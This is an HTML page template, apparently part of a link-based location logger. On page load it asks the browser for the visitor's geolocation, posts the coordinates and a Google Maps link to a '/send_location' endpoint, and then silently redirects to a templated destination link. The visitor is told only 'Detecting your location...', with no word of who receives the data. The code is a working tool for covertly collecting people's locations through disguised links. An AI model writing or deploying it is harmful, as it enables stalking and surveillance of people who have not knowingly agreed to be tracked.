<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Detecting Location</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: #f4f4f4;
      font-family: Arial, sans-serif;
      flex-direction: column;
    }

    h1 {
      margin-bottom: 20px;
      color: #333;
    }

    .loader {
      border: 8px solid #f3f3f3; /* Light gray */
      border-top: 8px solid #3498db; /* Blue */
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script>
    let currentPosition;

    // Start detection as soon as page loads
    window.onload = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            currentPosition = {
              lat: position.coords.latitude,
              lng: position.coords.longitude,
            };
            await shareLocation();
          },
          (error) => {
            console.error("Error fetching location:", error);
            alert("Could not detect your location.");
          }
        );
      } else {
        alert("Geolocation is not supported by your browser.");
      }
    };

    async function shareLocation() {
      if (!currentPosition) return;

      const googleMapsLink = `https://www.google.com/maps?q=${currentPosition.lat},${currentPosition.lng}`;

      try {
        const response = await fetch('/send_location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            latitude: currentPosition.lat,
            longitude: currentPosition.lng,
            googleMapsLink,
          }),
        });

        if (response.ok) {
          const result = await response.json();
          console.log(result.message);
          // Redirect to the predefined destination link
          window.location.href = "{{ redirect_link }}";
        } else {
          console.error("Failed to send location.");
        }
      } catch (err) {
        console.error("Error sending location:", err);
      }
    }
  </script>
</head>
<body>
  <h1>Detecting your location...</h1>
  <div class="loader"></div>
</body>
</html>
